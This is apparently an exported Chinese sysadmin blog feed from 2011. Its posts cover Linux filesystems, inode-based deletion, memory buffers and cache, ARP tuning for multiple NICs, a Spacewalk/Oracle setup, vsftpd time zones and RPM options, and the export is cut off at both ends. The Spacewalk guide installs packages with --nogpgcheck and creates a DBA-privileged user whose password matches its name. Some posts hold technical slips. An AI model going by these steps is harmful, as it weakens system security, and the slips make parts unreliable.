Linux 开发的原始的扩展文件系统(ext 或 extfs)的第四版。它 具有更高的兼容性并且消 除了存储限制,从 ext3升级至 ext4 不需要格式化分区。它的子目录具有可伸缩性。ext4 使用了一个多块分配来在一次调用中分配很多块。替换掉每次分配一个块,减少系统开销。在延时分配和 extends 上十分有用。而延迟分配是一个性能特性(它不修改磁盘格式)。相对于传统文件系统(例如ext3、reiser3、etc)所做的立刻分配块提供了更好的性能。</p><p>5、JFS</p><p>jsf 提供了基于日志的字节级文件系统,该文件系统是为面向事务的高性能系统而开发的。jsf 的开发者包括 AIX 的 jsf 的主要开发者。在 AIX 上,jfs 已经经受住了考验。它是可靠、快速和容易使用的。2000 年 2 月,ibm 宣布在一个开放资源许可证下,移植 linux 版的 JSF 文件系统。 JSFs 也是一个有大量用户安装使用的企业级文件系统。它具有可伸缩性和健壮性,与非日志文件系统相比,它的优点是其快速重启能力:Jfs 能够在几秒或几分钟内就把文件系统恢复到一致状态。虽然 jsf 主要是为满足服务器的高吞吐量和可靠性需求而设计的,jsf 还可用于想得到高性能和可靠性的客户机配置因为在系统崩溃时,jsf 能提供快速文件系统重启时间,所以它是因特网文件服务器的关键技术。使用数据库日志处理技术,jsf 能在几秒或几分钟之内把文件系统恢复到一致状态。而在非日志文件系统中,文件恢复可能花费几小时或几天。</p><p>6、ReiserFS</p><p>ReiserFS 的第一次公开亮相是在 1997 年 7 月 23 日,Hans Reiser 把他的基于平衡树结构的 ReiserFS 文件系统在网上公布。ReiserFS 3.6.x 是由 Hans Reiser 和他的在 Namesys的开发组共同开发设计的。Reiserfs 被看作是一个更加激进和现代的文件系统。传统的UNIX 文件系统是按盘块来进行空间分配的,对于目录和文件等的查找使用了简单的线性查找。这些设计在当时是合适的,但随着磁盘容量的增大和应用需求的增加,传统文件系统在存储效率,速度和功能上已显落后。 ReiserFS 一个最受人批评的缺点是每升级一个版本,都将要将磁盘重新格式化一次。</p><p>7、xfs</p><p>xfs 是一种非常优秀的日志文件系统,它是 SGI 公司设计的。xfs 被称为业界最先进的、最具可升级性的文件系统技术。SGI 的 xfs 可为 linux 和开放资源社区带来的新特性有:可升级性:xfs 被设计成可升级,以面对大多数的存储容量和 i/o 存储需求,可处理大型文件和包含巨大数量文件的大型目录,满足二十一世纪快速增长的磁盘需求。xfs 有能力动态地为文件分配索引空间,使系统形成高效支持大数量文件的能力。优秀的 i/o 性能:典型的现代服务器使用大型的条带式磁盘阵列,以提供达数 gb/秒的总带宽。xfs 可以很好地满足 I/O 请求的大小和并发 I/O 请求的数量。xfs 可作为 root 文件系统,并被 lilo 支持.在 NFS 服务器上使用也没问题.支持软件磁盘阵列(RAID)和虚拟集群(LVM)。由于 xfs 比较复杂,实施起来有一些难度</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ext3 </tag>
            
            <tag> ext4 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux下使用inode删除文件</title>
      <link href="/2011/08/08/use-inode-to-delete-files-under-linux/"/>
      <url>/2011/08/08/use-inode-to-delete-files-under-linux/</url>
      <content type="html"><![CDATA[<p>Linux 下有时候某些文件无法使用 rm 直接删除, 比如该文件的文件名含有终端不能正确显示的字符.<br># ls -li<br>total 0<br>441511 -rw-r–r– 1 root root 0 Apr 6 23:13 ???}????<br>当然如果该文件夹下没有别的文件. 可以直接 rm -rf * 删除,但是如果有别的不想删除的. 就只能通过 inode 删除了<br># find . -inum 441511 -delete<br>rm -i `find . -maxdepth 1 -inum 45656 -print`</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux操作系统中内存buffer和cache的区别</title>
      <link href="/2011/08/03/the-difference-between-memory-buffer-and-cache-in-the-linux-operating-system/"/>
      <url>/2011/08/03/the-difference-between-memory-buffer-and-cache-in-the-linux-operating-system/</url>
      <content type="html"><![CDATA[<p>Free<br>　　free 命令相对于top 提供了更简洁的查看系统内存使用情况：</p><p>　　$ free<br>　　total used free shared buffers cachedMem: 255268 238332 16936 0 85540 126384-/+ buffers/cache: 26408 228860Swap: 265000 0 265000</p><p>　　Mem：表示物理内存统计<br>　　-/+ buffers/cached：表示物理内存的缓存统计<br>　　Swap：表示硬盘上交换分区的使用情况，这里我们不去关心。</p><p>　　系统的总物理内存：255268Kb（256M），但系统当前真正可用的内存b并不是第一行free 标记的 16936Kb，它仅代表未被分配的内存。</p><p>　　我们使用total1、used1、free1、used2、free2 等名称来代表上面统计数据的各值，1、2 分别代表第一行和第二行的数据。</p><p>　　total1：表示物理内存总量。</p><p>　　used1：表示总计分配给缓存（包含buffers 与cache ）使用的数量，但其中可能部分缓存并未实际使用。</p><p>　　free1：未被分配的内存。</p><p>　　shared1：共享内存，一般系统不会用到，这里也不讨论。</p><p>　　buffers1：系统分配但未被使用的buffers 数量。</p><p>　　cached1：系统分配但未被使用的cache 数量。buffer 与cache 的区别见后面。</p><p>　　used2：实际使用的buffers 与cache 总量，也是实际使用的内存总量。</p><p>　　free2：未被使用的buffers 与cache 和未被分配的内存之和，这就是系统当前实际可用内存。</p><p>　　可以整理出如下等式：<br>　　total1 = used1 + free1total1 = used2 + free2used1 = buffers1 + cached1 + used2free2 = buffers1 + cached1 + free1</p><p>　　buffer 与cache 的区别<br>　　A buffer is something that has yet to be “written” to disk. A cache is something that has been “read” from the disk and stored for later use.</p><p>　　更详细的解释参考：Difference Between Buffer and Cache</p><p>　　对于共享内存（Shared memory），主要用于在UNIX 环境下不同进程之间共享数据，是进程间通信的一种方法，一般的应用程序不会申请使用共享内存，笔者也没有去验证共享内存对上面等式的影响。如果你有兴趣， 请参考：What is Shared Memory?</p><p>　　cache 和 buffer的区别：<br>　　Cache：高速缓存，是位于CPU与主内存间的一种容量较小但速度很高的存储器。由于 CPU的速度远高于主内存，CPU直接从内存中存取数据要等待一定时间周期，Cache中保存着CPU刚用过或循环使用的一部分数据，当CPU再次使用该 部分数据时可从Cache中直接调用,这样就减少了CPU的等待时间,提高了系统的效率。Cache又分为一级Cache(L1 Cache)和二级Cache(L2 Cache)，L1 Cache集成在CPU内部，L2 Cache早期一般是焊在主板上,现在也都集成在CPU内部，常见的容量有256KB或512KB L2 Cache。</p><p>　　Buffer：缓冲区，一个用于存储速度不同步的设备或优先级不同的设备之间传输数据的区域。通过缓冲区，可以使进程之间的相互等待变少，从而使从速度慢的设备读入数据时，速度快的设备的操作进程不发生间断。</p><p>　　Free中的buffer和cache：（它们都是占用内存）：</p><p>　　buffer : 作为buffer cache的内存，是块设备的读写缓冲区</p><p>　　cache: 作为page cache的内存, 文件系统的cache</p><p>　　如果 cache 的值很大，说明cache住的文件数很多。如果频繁访问到的文件都能被cache住，那么磁盘的读IO bi会非常小。</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux下多网卡不同IP在同一网段的情况</title>
      <link href="/2011/07/22/under-linux-different-ip-addresses-are-in-the-same-network-segment/"/>
      <url>/2011/07/22/under-linux-different-ip-addresses-are-in-the-same-network-segment/</url>
      <content type="html"><![CDATA[<p>今天在看Intel 1000 PT网卡的驱动时，有如下信息：</p><p>Multiple Interfaces on Same Ethernet Broadcast Network</p><p>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_filter</p><p>google了一下，有人已经试验了这个，摘录如下：</p><p><a href="http://blog.sina.com.cn/s/blog_544465b0010000kf.html" target="_blank" rel="noopener">http://blog.sina.com.cn/s/blog_544465b0010000kf.html</a></p><p><strong>多网卡在同一网段内的问题</strong>(2005-11-23 23:38:42)</p><p>分类：<a href="http://blog.sina.com.cn/s/articlelist_1413768624_5_1.html" target="_blank" rel="noopener">网络安全</a></p><p>关键字：Strict Interface ARP, Multi-link, Multipath, Multiple network cards on same subnet problem  </p><p>公司那个提供音乐下载的域名流量直逼 1Gbps，但是系统的连接却不高，服务器用的是DELL2850的，板载两个Gbe的网口，还插了两块Intel的Gbe网卡，因此打算通过多网卡的负 载均衡扩充一下系统的网络带宽。但是不想用多网卡的邦定，感觉那样不太灵活，因此决定采用Advanced Routing来解决这个问题。</p><p>查了一下 man ip，然后开始做了：</p><p>1) 给四个网口配置了四个地址</p><p>2) 在BIGIP上面把四个地址都加入到负载均衡</p><p>3) 用ip命令实现多网卡负载均衡</p><p>ip route replace default equalize scope global nexthop via 172.24.x.11 dev eth0 weight 1 nexthop via 172.24.x.11 dev eth1 weight 1 nexthop via 172.24.x.1 dev eth2 weight 1 nexthop via 172.24.x.11 dev eth3 weight 1</p><p>立即看到所有的流量被均衡到4个网口</p><p>但是出现了新的问题，大量的IP地址冲突信息出现在BIGIP的日志：</p><p>Nov 23 19:18:56 tc04 kernel: arp info overwritten for 172.24.x.30 by 00:14:22:1b:94:dc<br>Nov 23 20:30:24 tc04 kernel: arp info overwritten for 172.24.x.30 by 00:04:23:c0:5c:88<br>Nov 23 20:30:28 tc04 kernel: arp info overwritten for 172.24.x.30 by 00:14:22:1b:94:dc<br>Nov 23 21:03:14 tc04 kernel: arp info overwritten for 172.24.x.30 by 00:14:22:1b:94:dd</p><p>发现出现的几个产生IP冲突的MAC地址都是这台机器上面其他的网口的MAC，这就奇怪了。</p><p>通过tcpdump抓包，分析ARP信息发现是因为Linux响应ARP请求的时候，使用的IP地址并未被严格的限定，因此导致了这个问题。</p><p>很快 Google 到这篇文章：<a href="http://oss.sgi.com/projects/netdev/archive/2001-09/msg00098.html" target="_blank" rel="noopener">[PATCH] strict interface arp patch for Linux 2.4.2</a></p><p>然后就跑去 <a href="http://www.linuxvirtualserver.org/" target="_blank" rel="noopener">http://www.linuxvirtualserver.org/</a> 找到 <a href="http://www.linuxvirutalserver.org/docs/arp.html" target="_blank" rel="noopener">http://www.linuxvirutalserver.org/docs/arp.html</a></p><p>发现没有什么可用的信息，然后就硬着头皮进入到 /proc/sys/net/ipv4/conf/all 目录看看有啥线索是解决2.6的</p><p>看到三个文件 arp_announce, arp_ignore, arp_filter</p><p>立即去 /usr/src/linux/Documentation/networking/ip-sysctl.txt 找到相关的说明：</p><p>arp_filter - BOOLEAN<br>        1 - Allows you to have multiple network interfaces on the same<br>        subnet, and have the ARPs for each interface be answered<br>        based on whether or not the kernel would route a packet from<br>        the ARP’d IP out that interface (therefore you must use source<br>        based routing for this to work). In other words it allows control<br>        of which cards (usually 1) will respond to an arp request.</p><pre><code>0 - (default) The kernel can respond to arp requests with addresses  from other interfaces. This may seem wrong but it usually makes  sense, because it increases the chance of successful communication.  IP addresses are owned by the complete host on Linux, not by  particular interfaces. Only for more complex setups like load-  balancing, does this behaviour cause problems.arp_filter for the interface will be enabled if at least one of  conf/{all,interface}/arp_filter is set to TRUE,  it will be di sabled otherwise</code></pre><p>arp_announce - INTEGER<br>        Define different restriction levels for announcing the local<br>        source IP address from IP packets in ARP requests sent on<br>        interface:<br>        0 - (default) Use any local address, configured on any interface<br>        1 - Try to avoid local addresses that are not in the target’s<br>        subnet for this interface. This mode is useful when target<br>        hosts reachable via this interface require the source IP<br>        address in ARP requests to be part of their logical network<br>        configured on the receiving interface. When we generate the<br>        request we will check all our subnets that include the<br>        target IP and will preserve the source address if it is from<br>        such subnet. If there is no such subnet we select source<br>        address according to the rules for level 2.<br>        2 - Always use the best local address for this target.<br>        In this mode we ignore the source address in the IP packet<br>        and try to select local address that we prefer for talks with<br>        the target host. Such local address is selected by looking<br>        for primary IP addresses on all our subnets on the outgoing<br>        interface that include the target IP address. If no suitable<br>        local address is found we select the first local address<br>        we have on the outgoing interface or on all other interfaces,<br>        with the hope we will receive reply for our request and<br>        even sometimes no matter the source IP address we announce.</p><pre><code>The max value from conf/{all,interface}/arp_announce is used.Increasing the restriction level gives more chance for  receiving answer from the resolved target while decreasing  the level announces more valid sender&apos;s information.</code></pre><p>arp_ignore - INTEGER<br>        Define different modes for sending replies in response to<br>        received ARP requests that resolve local target IP addresses:<br>        0 - (default): reply for any local target IP address, configured<br>        on any interface<br>        1 - reply only if the target IP address is local address<br>        configured on the incoming interface<br>        2 - reply only if the target IP address is local address<br>        configured on the incoming interface and both with the<br>        sender’s IP address are part from same subnet on this interface<br>        3 - do not reply for local addresses configured with scope host,<br>        only resolutions for global and link addresses are replied<br>        4-7 - reserved<br>        8 - do not reply for all local addresses</p><pre><code>The max value from conf/{all,interface}/arp_ignore is used  when ARP request is received on the {interface}</code></pre><p>嘿嘿，通过：</p><p>echo 2 &gt; /proc/sys/net/ipv4/conf/all/arp_announce</p><p>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_ignore</p><p>or</p><p>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_filter</p><p>立即搞定！</p><p>继续 Google 了一些信息，发现前面两个内核控制好像是在 2.6.5 实现的 :-)</p><p>推荐用前面的两个，arp_filter应该也能解决，感觉前面的两个是对arp_filter的更细节控制的实现。</p><p>然后还发现在inter pro/1000的网卡驱动的安装指南里面也有一节：</p><p>Multiple Interfaces on Same Ethernet Broadcast Network<br>------------------------------------------------------</p><p>Due to the default ARP behavior on Linux, it is not possible to have<br>one system on two IP networks in the same Ethernet broadcast domain<br>(non-partitioned switch) behave as expected. All Ethernet interfaces<br>will respond to IP traffic for any IP address assigned to the system.<br>This results in unbalanced receive traffic.</p><p>If you have multiple interfaces in a server, either turn on ARP<br>filtering by entering:</p><p>echo 1 &gt; /proc/sys/net/ipv4/conf/all/arp_filter<br>(this only works if your kernel’s version is higher than 2.4.5),</p><p>or,</p><p>install the interfaces in separate broadcast domains (either<br>in different switches or in a switch partitioned to VLANs).</p><p>参考信息：</p><p><a href="http://linux-ip.net/html/ether-arp.html" target="_blank" rel="noopener">http://linux-ip.net/html/ether-arp.html</a></p><p><a href="http://www.austintek.com/LVS/LVS-HOWTO/HOWTO/LVS-HOWTO.arp_problem.html" target="_blank" rel="noopener">http://www.austintek.com/LVS/LVS-HOWTO/HOWTO/LVS-HOWTO.arp_problem.html</a></p><p><a href="http://www.ssi.bg/%7Eja/#arp_announce" target="_blank" rel="noopener">http://www.ssi.bg/~ja/#arp_announce</a></p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spacewalk Installation Instructions</title>
      <link href="/2011/07/14/spacewalk-installation-instructions/"/>
      <url>/2011/07/14/spacewalk-installation-instructions/</url>
      <content type="html"><![CDATA[<p>一、准备工作  </p><hr><h2 id="1-Setting-up-Spacewalk-repo"><a href="#1-Setting-up-Spacewalk-repo" class="headerlink" title="1.Setting up Spacewalk repo"></a>1.Setting up Spacewalk repo</h2><p>rpm -Uvh <a href="http://spacewalk.redhat.com/yum/1.4/RHEL/5/x86_64/spacewalk-repo-1.4-1.el5.noarch.rpm" target="_blank" rel="noopener">http://spacewalk.redhat.com/yum/1.4/RHEL/5/x86_64/spacewalk-repo-1.4-1.el5.noarch.rpm</a></p><h2 id="2-Additional-repos-amp-packages"><a href="#2-Additional-repos-amp-packages" class="headerlink" title="2.Additional repos &amp; packages"></a>2.Additional repos &amp; packages</h2><p>rpm -Uvh <a href="http://download.fedora.redhat.com/pub/epel/5/i386/epel-release-5-4.noarch.rpm" target="_blank" rel="noopener">http://download.fedora.redhat.com/pub/epel/5/i386/epel-release-5-4.noarch.rpm</a>  </p><p>3.Follow the instructions to use <strong>EPEL5</strong> with the additions: </p><ul><li><p>Necessary packages rhn-client-tools and rhnlib were removed from CentOS, they can be found in spacewalk-client repo. Setup it by installing spacewalk-client-repo package.</p><p>rpm -ihv <a href="http://spacewalk.redhat.com/yum/1.4-client/RHEL/5/x86_64/spacewalk-client-repo-1.4-1.el5.noarch.rpm" target="_blank" rel="noopener">http://spacewalk.redhat.com/yum/1.4-client/RHEL/5/x86_64/spacewalk-client-repo-1.4-1.el5.noarch.rpm</a> </p></li><li><p>Import Redhat’s RPM GPG key:</p><p># wget -O /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release <a href="http://www.redhat.com/security/37017186.txt" target="_blank" rel="noopener">http://www.redhat.com/security/37017186.txt</a> # rpm –import /etc/pki/rpm-gpg/RPM-GPG-KEY-redhat-release</p></li></ul><p>二、数据库安装Oracle Pre-Requisites  </p><h2 id="Download"><a href="#Download" class="headerlink" title="Download "></a>Download </h2><h2 id="server-oracle-xe-univ-10-2-0-1-1-0-i386-rpm"><a href="#server-oracle-xe-univ-10-2-0-1-1-0-i386-rpm" class="headerlink" title="server: oracle-xe-univ-10.2.0.1-1.0.i386.rpm"></a>server: oracle-xe-univ-10.2.0.1-1.0.i386.rpm</h2><p>client:  </p><ul><li>oracle-instantclient11.2-basic-11.2.0.2.0.ARCH.rpm</li><li>oracle-instantclient11.2-sqlplus-11.2.0.2.0.ARCH.rpm</li></ul><p># /usr/sbin/groupadd -r dba # /usr/sbin/useradd -r -M -g dba -d /usr/lib/oracle/xe -s /bin/bash oracle  </p><p>and check swap size &gt; 1G<br>yum -y install bc libc.so.6 libaio.so.1<br> yum -y localinstall –nogpgcheck oracle-xe-univ-10.2.0.1-1.0.i386.rpm<br>yum -y localinstall –nogpgcheck oracle-instantclient11.2-basic<em>.rpm oracle-instantclient11.2-sqlplus</em>.rpm<br>yum -y install oracle-lib-compat<br>yum -y install oracle-xe-selinux oracle-instantclient-selinux oracle-instantclient-sqlplus-selinux<br>配置 /etc/init.d/oracle-xe configure<br>HTTP port for Oracle Application Express: 9055只修改端口，其他的默认<br>测试：sqlplus ‘sys/<password>@//localhost/XE as sysdba’  </password></p><h2 id="Create-the-spacewalk-database-user"><a href="#Create-the-spacewalk-database-user" class="headerlink" title="Create the spacewalk database user"></a>Create the spacewalk database user</h2><p>SQL&gt; create user spacewalk identified by spacewalk default tablespace users; SQL&gt; grant dba to spacewalk; SQL&gt; quit<br>测试sqlplus spacewalk/spacewalk@//localhost/XE  </p><h2 id="Additional-Oracle-configuration"><a href="#Additional-Oracle-configuration" class="headerlink" title="Additional Oracle configuration"></a>Additional Oracle configuration</h2><p># sqlplus spacewalk/spacewalk@//localhost/XE SQL&gt; alter system set processes = 400 scope=spfile;  SQL&gt; alter system set “_optimizer_filter_pred_pullup”=false scope=spfile;  SQL&gt; alter system set “_optimizer_cost_based_transformation”=off scope=spfile;  SQL&gt; quit   # /sbin/service oracle-xe restart </p><p>三、安装<br>yum remove cobbler-web<br>yum install spacewalk-oracle   </p><h2 id="Configuring-the-firewall"><a href="#Configuring-the-firewall" class="headerlink" title="Configuring the firewall"></a>Configuring the firewall</h2><p>iptables -D RH-Firewall-1-INPUT -j REJECT –reject-with icmp-host-prohibited iptables -A RH-Firewall-1-INPUT -p tcp -m tcp –dport 443 -j ACCEPT iptables -A RH-Firewall-1-INPUT -p tcp -m tcp –dport 80 -j ACCEPT iptables -A RH-Firewall-1-INPUT -j REJECT –reject-with icmp-host-prohibited service iptables save service iptables restart  </p><h2 id="Configuring-Spacewalk"><a href="#Configuring-Spacewalk" class="headerlink" title="Configuring Spacewalk"></a>Configuring Spacewalk</h2><p>spacewalk-setup –disconnected<br>Database service name (SID)? XE<br>其他的默认，创建CA证书和cobbler  </p><p>可以使用<a href="http://hostname.localdomain.com去访问了。" target="_blank" rel="noopener">http://hostname.localdomain.com去访问了。</a><br> 要查看日志在/var/log/tomcat5/catalina.out 如果使用tomcat6，要<br>chmod g+w /var/log/tomcat6</p>]]></content>
      
      <categories>
          
          <category> 默认分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rhel5.4安装spacewalk </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vsftpd时区问题的解决</title>
      <link href="/2011/07/06/vsftpd-time-zone-problem-solving/"/>
      <url>/2011/07/06/vsftpd-time-zone-problem-solving/</url>
      <content type="html"><![CDATA[<p>今天上面让开个ftp的服务<br>就找一台linux的服务器安装了vsftp<br>后来看到外边的客户来下载资料的时候发现日志里面的时间和本地相差8小时<br>立即感觉是vsftp的时区问题<br>找vsftpd的配置帮助文件<br>发现下面的一个参数<br>设置为yes后日志里面的时间就正确了<br>在次小记一下<br>use_localtime<br>If enabled, vsftpd will display directory listings with the time in your local time zone. The default is to display GMT. The times returned by the MDTM FTP command are also affected by this option.<br>Default: NO</p>]]></content>
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vsftpd </tag>
            
            <tag> vsftpd时区 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux操作系统中RPM命令参数的使用详解</title>
      <link href="/2011/06/30/the-use-of-rpm-command-parameters-in-the-linux-operating-system-is-detailed/"/>
      <url>/2011/06/30/the-use-of-rpm-command-parameters-in-the-linux-operating-system-is-detailed/</url>
      <content type="html"><![CDATA[<p>在<strong>Linux</strong>操作系统中，有一个系统<strong>软件</strong>包，它的功能类似于Windows里面的“添加/删除程序”，但是功能又比“添加/删除程序”强很多，它就是Red Hat Package Manager(简称<strong>RPM</strong>)。此工具包最先是由Red Hat公司推出的，后来被其他Linux开发商所借用。由于它为Linux使用者省去了很多时间，所以被广泛<strong>应用</strong>于在Linux下安装、删除软件。下面就给大家介绍一下它的具体<strong>使用</strong>方法。</p><p>[root@ford /root] # rpm -qa | more</p><p>◆1.我们得到一个新软件，在安装之前，一般都要先查看一下这个软件包里有什么内容，假设这个文件是：Linux-1.4-6.i368.rpm，我们可以用这条<strong>命令</strong>查看：</p><p>rpm -qpi Linux-1.4-6.i368.rpm</p><p>系统将会列出这个软件包的详细资料，包括含有多少个文件、各文件名称、文件大小、创建时间、编译日期等信息。</p><p>◆2.上面列出的所有文件在安装时不一定全部安装，就像Windows下程序的安装方式分为典型、完全、自定义一样，Linux也会让你选择安装方式，此时我们可以用下面这条命令查看软件包将会在系统里安装哪些部分，以方便我们的选择：</p><p>rpm -qpl Linux-1.4-6.i368.rpm</p><p>◆3.选择安装方式后，开始安装。我们可以用rpm -ivh Linux-1.4-6.i368.rpm命令安装此软件。在安装过程中，若系统提示此软件已安装过或因其他原因无法继续安装，但若我们确实想执行安装命令，可以在 -ivh后加一<strong>参数</strong>“-replacepkgs”：</p><p>rpm -ivh -replacepkgs Linux-1.4-6.i368.rpm</p><p>◆4.有时我们卸载某个安装过的软件，只需执行</p><p>rpm -e ＜文件名＞  命令即可。</p><p>◆5.对低版本软件进行升级是提高其功能的好办法，这样可以省去我们卸载后再安装新软件的麻烦，要升级某个软件，只须执行如下命令：rpm -uvh ＜文件名＞，注意：此时的文件名必须是要升级软件的升级补丁</p><p>◆6. 另外一个安装软件的方法可谓是Linux的独到之处，同时也是RMP强大功能的一个表现：通过FTP站点直接在线安装软件。当找到含有你所需软件的站点并 与此网站连接后，执行下面的命令即可实现在线安装，譬如在线安装Linux-1.4-6.i368.rpm，可以用命令：</p><p>rpm -i<a href="ftp://ftp.pht.com/pub/linux/redhat/...-1.4-6.i368.rpm" target="_blank" rel="noopener">ftp://ftp.pht.com/pub/linux/redhat/…-1.4-6.i368.rpm</a></p><p>◆7. 在我们使用电脑过程中，难免会有误操作，若我们误删了几个文件而影响了系统的性能时，怎样查找到底少了哪些文件呢?RPM软件包提供了一个查找损坏文件的 功能，执行此命令：rpm -Va 即可，Linux将为你列出所有损坏的文件。你可以通过Linux的安装光盘进行修复。</p><p>◆8.Linux系统中文件繁多，在使用过程中，难免会碰到我们不认识的文件，在Windows下我们可以用“开始/查找”菜单快速判断某个文件属于哪个文件夹，在Linux中，下面这条命令行可以帮助我们快速判定某个文件属于哪个软件包：</p><p>rpm -qf ＜文件名＞</p><p>◆9.当每个软件包安装在Linux系统后，安装文件都会到RPM数据库中“报到”，所以，我们要查询某个已安装软件的属性时，只需到此数据库中查找即可。注意：此时的查询命令不同于1和8介绍的查询，这种方法只适用于已安装过的软件包！命令格式：</p><p><strong>一、安装</strong></p><p>命令格式：</p><p>rpm -i ( or –install) options file1.rpm … fileN.rpm</p><p>参数：</p><p>file1.rpm … fileN.rpm 将要安装的RPM包的文件名</p><p>详细选项：</p><p>-h (or –hash) 安装时输出hash记号 (<code></code>#’’)</p><p>–test 只对安装进行测试，并不实际安装。</p><p>–percent 以百分比的形式输出安装的进度。</p><p>–excludedocs 不安装软件包中的文档文件</p><p>–includedocs 安装文档</p><p>–replacepkgs 强制重新安装已经安装的软件包</p><p>–replacefiles 替换属于其它软件包的文件</p><p>–force 忽略软件包及文件的冲突</p><p>–noscripts 不运行预安装和后安装脚本</p><p>–prefix ＜path＞ 将软件包安装到由 ＜path＞ 指定的路径下</p><p>–ignorearch 不校验软件包的结构</p><p>–ignoreos 不检查软件包运行的<strong>操作系统</strong></p><p>–nodeps 不检查依赖性关系</p><p>–ftpproxy ＜host＞ 用 ＜host＞ 作为 FTP代理</p><p>–ftpport ＜port＞ 指定FTP的端口号为 ＜port＞</p><p>通用选项</p><p>-v 显示附加信息</p><p>-vv 显示调试信息</p><p>–root ＜path＞ 让RPM将＜path＞指定的路径做为”根目录”，这样预安装程序和后安</p><p>装程序都会安装到这个目录下</p><p>–rcfile ＜rcfile＞ 设置rpmrc文件为 ＜rcfile＞</p><p>–dbpath ＜path＞ 设置RPM 资料库存所在的路径为 ＜path＞</p><p><strong>二、删除</strong></p><p>命令格式：</p><p>rpm -e ( or –erase) options pkg1 … pkgN</p><p>参数</p><p>pkg1 … pkgN ：要删除的软件包</p><p>详细选项</p><p>–test 只执行删除的测试</p><p>–noscripts 不运行预安装和后安装脚本程序</p><p>–nodeps 不检查依赖性</p><p>通用选项</p><p>-vv 显示调试信息</p><p>–root ＜path＞ 让RPM将＜path＞指定的路径做为”根目录”，这样预安装程序和后安装</p><p>程序都会安装到这个目录下</p><p>–rcfile ＜rcfile＞ 设置rpmrc文件为 ＜rcfile＞</p><p>–dbpath ＜path＞ 设置RPM 资料库存所在的路径为 ＜path＞</p><p><strong>三、升级</strong></p><p>命令格式</p><p>rpm -U ( or –upgrade) options file1.rpm … fileN.rpm</p><p>参数</p><p>file1.rpm … fileN.rpm 软件包的名字</p><p>详细选项</p><p>-h (or –hash) 安装时输出hash记号 (<code></code>#’’)</p><p>–oldpackage 允许”升级”到一个老版本</p><p>–test 只进行升级测试</p><p>–excludedocs 不安装软件包中的文档文件</p><p>–includedocs 安装文档</p><p>–replacepkgs 强制重新安装已经安装的软件包</p><p>–replacefiles 替换属于其它软件包的文件</p><p>–force 忽略软件包及文件的冲突</p><p>–percent 以百分比的形式输出安装的进度。</p><p>–noscripts 不运行预安装和后安装脚本</p><p>–prefix ＜path＞ 将软件包安装到由 ＜path＞ 指定的路径下</p><p>–ignorearch 不校验软件包的结构</p><p>–ignoreos 不检查软件包运行的操作系统</p><p>–nodeps 不检查依赖性关系</p><p>–ftpproxy ＜host＞ 用 ＜host＞ 作为 FTP代理</p><p>–ftpport ＜port＞ 指定FTP的端口号为 ＜port＞</p><p>通用选项</p><p>-v 显示附加信息</p><p>-vv 显示调试信息</p><p>–root ＜path＞ 让RPM将＜path＞指定的路径做为”根目录”，这样预安装程序和后安装程序都会安装到这个目录下</p><p>–rcfile ＜rcfile＞ 设置rpmrc文件为 ＜rcfile＞</p><p>–dbpath ＜path＞ 设置RPM 资料库存所在的路径为 ＜path＞</p><p><strong>四、查询</strong></p><p>命令格式：</p><p>rpm -q ( or –query) options</p><p>参数：</p><p>pkg1 … pkgN ：查询已安装的软件包</p><p>详细选项</p><p>-p ＜file＞(or <code></code>-‘’) 查询软件包的文件</p><p>-f ＜file＞ 查询＜file＞属于哪个软件包</p><p>-a 查询所有安装的软件包</p><p>–whatprovides ＜x＞ 查询提供了 ＜x＞功能的软件包</p><p>-g ＜group＞ 查询属于＜group＞ 组的软件包</p><p>–whatrequires ＜x＞ 查询所有需要 ＜x＞ 功能的软件包</p><p>信息选项</p><p>＜null＞ 显示软件包的全部标识</p><p>-i 显示软件包的概要信息</p><p>-l 显示软件包中的文件列表</p><p>-c 显示配置文件列表</p><p>-d 显示文档文件列表</p><p>-s 显示软件包中文件列表并显示每个文件的状态</p><p>–scripts 显示安装、卸载、校验脚本</p><p>–queryformat (or –qf) 以用户指定的方式显示查询信息</p><p>–dump 显示每个文件的所有已校验信息</p><p>–provides 显示软件包提供的功能</p><p>–requires (or -R) 显示软件包所需的功能</p><p>通用选项</p><p>-v 显示附加信息</p><p>-vv 显示调试信息</p><p>–root ＜path＞ 让RPM将＜path＞指定的路径做为”根目录”，这样预安装程序和后安装程序都会安装到这个目录下</p><p>–rcfile ＜rcfile＞ 设置rpmrc文件为 ＜rcfile＞</p><p>–dbpath ＜path＞ 设置RPM 资料库存所在的路径为 ＜path＞</p><p><strong>五、校验已安装的软件包</strong></p><p>命令格式：</p><p>rpm -V ( or –verify, or -y) options</p><p>参数</p><p>pkg1 … pkgN 将要校验的软件包名</p><p>软件包选项</p><p>-p ＜file＞ Verify against package file ＜file＞</p><p>-f ＜file＞ 校验＜file＞所属的软件包</p><p>-a Verify 校验所有的软件包</p><p>-g ＜group＞ 校验所有属于组 ＜group＞ 的软件包</p><p>详细选项</p><p>–noscripts 不运行校验脚本</p><p>–nodeps 不校验依赖性</p><p>–nofiles 不校验文件属性</p><p>通用选项</p><p>-v 显示附加信息</p><p>-vv 显示调试信息</p><p>–root ＜path＞ 让RPM将＜path＞指定的路径做为”根目录”，这样预安装程序和后安装程序都会安装到这个目录下</p><p>–rcfile ＜rcfile＞ 设置rpmrc文件为 ＜rcfile＞</p><p>–dbpath ＜path＞ 设置RPM 资料库存所在的路径为 ＜path＞</p><p><strong>六、校验软件包中的文件</strong></p><p>语法：</p><p>rpm -K ( or –checksig) options file1.rpm … fileN.rpm</p><p>参数：</p><p>file1.rpm … fileN.rpm 软件包的文件名</p><p>Checksig–详细选项</p><p>–nopgp 不校验PGP签名</p><p>通用选项</p><p>-v 显示附加信息</p><p>-vv 